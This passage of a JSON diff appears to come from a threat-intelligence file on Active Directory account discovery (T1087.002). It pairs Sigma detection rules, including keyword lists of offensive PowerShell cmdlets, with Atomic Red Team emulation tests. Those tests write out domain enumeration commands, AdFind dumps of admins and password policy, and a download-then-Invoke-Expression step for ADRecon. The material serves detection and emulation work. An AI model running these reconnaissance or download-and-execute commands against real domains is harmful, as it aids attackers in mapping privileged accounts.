+                            "raw": "author: Samir Bousseaden\ndate: 2019/04/03\ndescription: Detect priv users or groups recon based on 4661 eventid and known privileged\n  users or groups SIDs\ndetection:\n  condition: selection and selection_object and not filter\n  filter:\n    SubjectUserName|endswith: $\n  selection:\n    EventID: 4661\n    ObjectType:\n    - SAM_USER\n    - SAM_GROUP\n  selection_object:\n  - ObjectName|endswith:\n    - '-512'\n    - '-502'\n    - '-500'\n    - '-505'\n    - '-519'\n    - '-520'\n    - '-544'\n    - '-551'\n    - '-555'\n  - ObjectName|contains: admin\nfalsepositives:\n- If source account name is not an admin then its super suspicious\nid: 35ba1d85-724d-42a3-889f-2e2362bcaf23\nlevel: high\nlogsource:\n  definition: 'Requirements: enable Object Access SAM on your Domain Controllers'\n  product: windows\n  service: security\nmodified: 2022/07/13\nreferences:\n- https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087.002\ntitle: AD Privileged Users or Groups Reconnaissance\n",
+                            "sigma:id": "35ba1d85-724d-42a3-889f-2e2362bcaf23",
+                            "title": "AD Privileged Users or Groups Reconnaissance",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+                        "lookup_data": {
+                            "description": "Detects the use of a renamed Adfind.exe. AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/21\ndescription: Detects the use of a renamed Adfind.exe. AdFind continues to be seen\n  across majority of breaches. It is used to domain trust discovery to plan out subsequent\n  steps in the attack chain.\ndetection:\n  condition: 1 of selection* and not filter\n  filter:\n    Image|endswith: \\AdFind.exe\n  selection_1:\n    CommandLine|contains:\n    - domainlist\n    - trustdmp\n    - dcmodes\n    - adinfo\n    - ' dclist '\n    - computer_pwdnotreqd\n    - objectcategory=\n    - -subnets -f\n    - name=\"Domain Admins\"\n    - '-sc u:'\n    - domainncs\n    - dompol\n    - ' oudmp '\n    - subnetdmp\n    - gpodmp\n    - fspdmp\n    - users_noexpire\n    - computers_active\n    - computers_pwdnotreqd\n  selection_2:\n  - Imphash:\n    - bca5675746d13a1f246e2da3c2217492\n    - 53e117a96057eaf19c41380d0e87f1c2\n  - Hashes|contains:\n    - IMPHASH=BCA5675746D13A1F246E2DA3C2217492\n    - IMPHASH=53E117A96057EAF19C41380D0E87F1C2\n  selection_3:\n    OriginalFileName: AdFind.exe\nfalsepositives:\n- Unknown\nid: df55196f-f105-44d3-a675-e9dfb6cc2f2b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/01\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://thedfirreport.com/2020/05/08/adfind-recon/\n- https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: Renamed AdFind Detection\n",
+                            "sigma:id": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+                            "title": "Renamed AdFind Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
+                        "lookup_data": {
+                            "description": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021/12/18\ndescription: Detects usage of the PsLogList utility to dump event log in order to\n  extract admin accounts and perform account discovery or delete events logs\ndetection:\n  condition: all of selection_*\n  selection_cli_eventlog:\n    CommandLine|contains:\n    - ' security'\n    - ' application'\n    - ' system'\n  selection_cli_flags:\n    CommandLine|contains:\n    - ' -d'\n    - ' /d'\n    - ' -x'\n    - ' /x'\n    - ' -s'\n    - ' /s'\n    - ' -c'\n    - ' /c'\n    - ' -g'\n    - ' /g'\n  selection_img:\n  - OriginalFileName: psloglist.exe\n  - Image|endswith:\n    - \\psloglist.exe\n    - \\psloglist64.exe\nfalsepositives:\n- Another tool that uses the command line switches of PsLogList\n- Legitimate use of PsLogList by an administrator\nid: aae1243f-d8af-40d8-ab20-33fc6d0c55bc\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/16\nreferences:\n- https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/\n- https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos\n- https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList\n- https://twitter.com/EricaZelic/status/1614075109827874817\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\ntitle: Suspicious Use of PsLogList\n",
+                            "sigma:id": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
+                            "title": "Suspicious Use of PsLogList",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "455b9d50-15a1-4b99-853f-8d37655a4c1b",
+                        "lookup_data": {
+                            "description": "Detects the execution of a AdFind for enumeration based on it's commadline flags",
+                            "raw": "author: frack113\ndate: 2021/12/13\ndescription: Detects the execution of a AdFind for enumeration based on it's commadline\n  flags\ndetection:\n  condition: 1 of selection_*\n  selection_enum_ad:\n    CommandLine|contains: -sc admincountdmp\n  selection_enum_exchange:\n    CommandLine|contains: -sc exchaddresses\n  selection_password:\n    CommandLine|contains:\n    - lockoutduration\n    - lockoutthreshold\n    - lockoutobservationwindow\n    - maxpwdage\n    - minpwdage\n    - minpwdlength\n    - pwdhistorylength\n    - pwdproperties\nfalsepositives:\n- Administrative activity\nid: 455b9d50-15a1-4b99-853f-8d37655a4c1b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.002/T1087.002.md\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087.002\ntitle: Suspicious AdFind Enumeration\n",
+                            "sigma:id": "455b9d50-15a1-4b99-853f-8d37655a4c1b",
+                            "title": "Suspicious AdFind Enumeration",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "66a0bdc6-ee04-441a-9125-99d2eb547942",
+                        "lookup_data": {
+                            "description": "Domain user and group enumeration via network reconnaissance.\nSeen in APT 29 and other common tactics and actors. Detects a set of RPC (remote procedure calls) used to enumerate a domain controller.\nThe rule was created based off the datasets and hackathon from https://github.com/OTRF/detection-hackathon-apt29\n",
+                            "raw": "author: Nate Guagenti (@neu5ron), Open Threat Research (OTR)\ndate: 2020/05/03\ndescription: 'Domain user and group enumeration via network reconnaissance.\n\n  Seen in APT 29 and other common tactics and actors. Detects a set of RPC (remote\n  procedure calls) used to enumerate a domain controller.\n\n  The rule was created based off the datasets and hackathon from https://github.com/OTRF/detection-hackathon-apt29\n\n  '\ndetection:\n  condition: selection | count(operation) by src_ip > 4\n  selection:\n    operation:\n    - LsarLookupNames3\n    - LsarLookupSids3\n    - SamrGetGroupsForUser\n    - SamrLookupIdsInDomain\n    - SamrLookupNamesInDomain\n    - SamrQuerySecurityObject\n    - SamrQueryInformationGroup\n  timeframe: 30s\nfalsepositives:\n- Devices that may do authentication like a VPN or a firewall that looksup IPs to\n  username\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nid: 66a0bdc6-ee04-441a-9125-99d2eb547942\nlevel: medium\nlogsource:\n  product: zeek\n  service: dce_rpc\nmodified: 2022/12/25\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29\n- https://github.com/OTRF/detection-hackathon-apt29/issues/37\nstatus: test\ntags:\n- attack.discovery\n- attack.t1087.002\n- attack.t1082\ntitle: Domain User Enumeration Network Recon 01\n",
+                            "sigma:id": "66a0bdc6-ee04-441a-9125-99d2eb547942",
+                            "title": "Domain User Enumeration Network Recon 01",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "31d68132-4038-47c7-8f8e-635a39a7c174",
+                        "lookup_data": {
+                            "description": "Detects potential Active Directory enumeration via LDAP",
+                            "raw": "author: Adeem Mawani\ndate: 2021/06/22\ndescription: Detects potential Active Directory enumeration via LDAP\ndetection:\n  condition: (generic_search and not narrow_down_filter) or suspicious_flag\n  generic_search:\n    EventID: 30\n    SearchFilter|contains:\n    - (groupType:1.2.840.113556.1.4.803:=2147483648)\n    - (groupType:1.2.840.113556.1.4.803:=2147483656)\n    - (groupType:1.2.840.113556.1.4.803:=2147483652)\n    - (groupType:1.2.840.113556.1.4.803:=2147483650)\n    - (sAMAccountType=805306369)\n    - (sAMAccountType=805306368)\n    - (sAMAccountType=536870913)\n    - (sAMAccountType=536870912)\n    - (sAMAccountType=268435457)\n    - (sAMAccountType=268435456)\n    - (objectCategory=groupPolicyContainer)\n    - (objectCategory=organizationalUnit)\n    - (objectCategory=Computer)\n    - (objectCategory=nTDSDSA)\n    - (objectCategory=server)\n    - (objectCategory=domain)\n    - (objectCategory=person)\n    - (objectCategory=group)\n    - (objectCategory=user)\n    - (objectClass=trustedDomain)\n    - (objectClass=computer)\n    - (objectClass=server)\n    - (objectClass=group)\n    - (objectClass=user)\n    - (primaryGroupID=521)\n    - (primaryGroupID=516)\n    - (primaryGroupID=515)\n    - (primaryGroupID=512)\n    - Domain Admins\n    - objectGUID=\\*\n    - (schemaIDGUID=\\*)\n  narrow_down_filter:\n    EventID: 30\n    SearchFilter|contains:\n    - (domainSid=*)\n    - (objectSid=*)\n  suspicious_flag:\n    EventID: 30\n    SearchFilter|contains:\n    - (userAccountControl:1.2.840.113556.1.4.803:=4194304)\n    - (userAccountControl:1.2.840.113556.1.4.803:=2097152)\n    - '!(userAccountControl:1.2.840.113556.1.4.803:=1048574)'\n    - (userAccountControl:1.2.840.113556.1.4.803:=524288)\n    - (userAccountControl:1.2.840.113556.1.4.803:=65536)\n    - (userAccountControl:1.2.840.113556.1.4.803:=8192)\n    - (userAccountControl:1.2.840.113556.1.4.803:=544)\n    - '!(UserAccountControl:1.2.840.113556.1.4.803:=2)'\n    - msDS-AllowedToActOnBehalfOfOtherIdentity\n    - msDS-AllowedToDelegateTo\n    - msDS-GroupManagedServiceAccount\n    - (accountExpires=9223372036854775807)\n    - (accountExpires=0)\n    - (adminCount=1)\n    - ms-MCS-AdmPwd\nid: 31d68132-4038-47c7-8f8e-635a39a7c174\nlevel: medium\nlogsource:\n  definition: 'Requirements: Microsoft-Windows-LDAP-Client/Debug ETW logging'\n  product: windows\n  service: ldap_debug\nmodified: 2022/12/28\nreferences:\n- https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726\n- https://github.com/PowerShellMafia/PowerSploit/blob/d943001a7defb5e0d1657085a77a0e78609be58f/Recon/PowerView.ps1\n- https://github.com/BloodHoundAD/SharpHound3/blob/7d96b991b1887ff50349ce59c80980bc0d95c86a/SharpHound3/LdapBuilder.cs\n- https://medium.com/falconforce/falconfriday-detecting-active-directory-data-collection-0xff21-c22d1a57494c\n- https://github.com/fox-it/BloodHound.py/blob/d65eb614831cd30f26028ccb072f5e77ca287e0b/bloodhound/ad/domain.py#L427\nstatus: test\ntags:\n- attack.discovery\n- attack.t1069.002\n- attack.t1087.002\n- attack.t1482\ntitle: Potential Active Directory Reconnaissance/Enumeration Via LDAP\n",
+                            "sigma:id": "31d68132-4038-47c7-8f8e-635a39a7c174",
+                            "title": "Potential Active Directory Reconnaissance/Enumeration Via LDAP",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "619b020f-0fd7-4f23-87db-3f51ef837a34",
+                        "lookup_data": {
+                            "description": "Detects enumeration of the global catalog (that can be performed using BloodHound or others AD reconnaissance tools). Adjust Threshold according to domain width.",
+                            "raw": "author: Chakib Gzenayi (@Chak092), Hosni Mribah\ndate: 2020/05/11\ndescription: Detects enumeration of the global catalog (that can be performed using\n  BloodHound or others AD reconnaissance tools). Adjust Threshold according to domain\n  width.\ndetection:\n  condition: selection | count() by SourceAddress > 2000\n  selection:\n    DestPort:\n    - 3268\n    - 3269\n    EventID: 5156\n  timeframe: 1h\nfalsepositives:\n- Exclude known DCs.\nid: 619b020f-0fd7-4f23-87db-3f51ef837a34\nlevel: medium\nlogsource:\n  definition: The advanced audit policy setting \"Windows Filtering Platform > Filtering\n    Platform Connection\" must be configured for Success\n  product: windows\n  service: security\nmodified: 2022/08/15\nreferences:\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087.002\ntitle: Enumeration via the Global Catalog\n",
+                            "sigma:id": "619b020f-0fd7-4f23-87db-3f51ef837a34",
+                            "title": "Enumeration via the Global Catalog",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
+                        "lookup_data": {
+                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/20\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    Payload|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n  type: similar\n- id: 02030f2f-6199-49ec-b258-ea71b07e03dc\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - PoshModule\n",
+                            "sigma:id": "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
+                            "title": "Malicious PowerShell Commandlets - PoshModule",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "75df3b17-8bcc-4565-b89b-c9898acef911",
+                        "lookup_data": {
+                            "description": "Detects the execution of a AdFind for Active Directory enumeration",
+                            "raw": "author: FPT.EagleEye Team, omkar72, oscd.community\ndate: 2020/09/26\ndescription: Detects the execution of a AdFind for Active Directory enumeration\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - objectcategory\n    - trustdmp\n    - dcmodes\n    - dclist\n    - computers_pwdnotreqd\n    Image|endswith: \\adfind.exe\nfalsepositives:\n- Administrative activity\nid: 75df3b17-8bcc-4565-b89b-c9898acef911\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/05/12\nreferences:\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md\n- https://thedfirreport.com/2020/05/08/adfind-recon/\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: Suspicious AdFind Execution\n",
+                            "sigma:id": "75df3b17-8bcc-4565-b89b-c9898acef911",
+                            "title": "Suspicious AdFind Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                        "lookup_data": {
+                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
+                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1674763285",
+                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1087.002",
+                "display_name": "Account Discovery: Domain Account",
+                "atomic_tests": [
+                    {
+                        "name": "Enumerate all accounts (Domain)",
+                        "auto_generated_guid": "6fbc9e68-5ad7-444a-bd11-8bf3136c477e",
+                        "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "net user /domain\nnet group /domain\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Enumerate all accounts via PowerShell (Domain)",
+                        "auto_generated_guid": "8b8a6449-be98-4f42-afd2-dedddc7453b2",
+                        "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "net user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Enumerate logged on users via CMD (Domain)",
+                        "auto_generated_guid": "161dcd85-d014-4f5e-900c-d3eaae82a0f7",
+                        "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "computer_name": {
+                                "description": "Name of remote system to query",
+                                "type": "string",
+                                "default": "%COMPUTERNAME%"
+                            }
+                        },
+                        "executor": {
+                            "command": "query user /SERVER:#{computer_name}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Automated AD Recon (ADRecon)",
+                        "auto_generated_guid": "95018438-454a-468c-a0fa-59c800149b59",
+                        "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "adrecon_path": {
+                                "description": "Path of ADRecon.ps1 file",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "ADRecon must exist on disk at specified location (#{adrecon_path})\n",
+                                "prereq_command": "if (Test-Path \"#{adrecon_path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1\" -OutFile \"#{adrecon_path}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Invoke-Expression \"#{adrecon_path}\"\n",
+                            "cleanup_command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Adfind -Listing password policy",
+                        "auto_generated_guid": "736b4f53-f400-4c22-855d-1a6b5a551600",
+                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "optional_args": {
+                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
+                                "type": "string",
+                                "default": null
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Adfind - Enumerate Active Directory Admins",
+                        "auto_generated_guid": "b95fd967-4e62-4109-b48d-265edfd28c3a",
+                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "optional_args": {
+                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
+                                "type": "string",
+                                "default": null
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp #{optional_args}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Adfind - Enumerate Active Directory User Objects",
+                        "auto_generated_guid": "e1ec8d20-509a-4b9a-b820-06c9b2da8eb7",
+                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "optional_args": {
+                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
+                                "type": "string",
+                                "default": null
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
